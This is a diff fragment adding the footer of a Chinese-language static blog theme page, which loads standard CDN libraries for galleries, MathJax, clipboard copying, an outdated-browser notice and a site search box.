+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+    <script src="/js/clipboard.js" defer></script>
+    
+
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
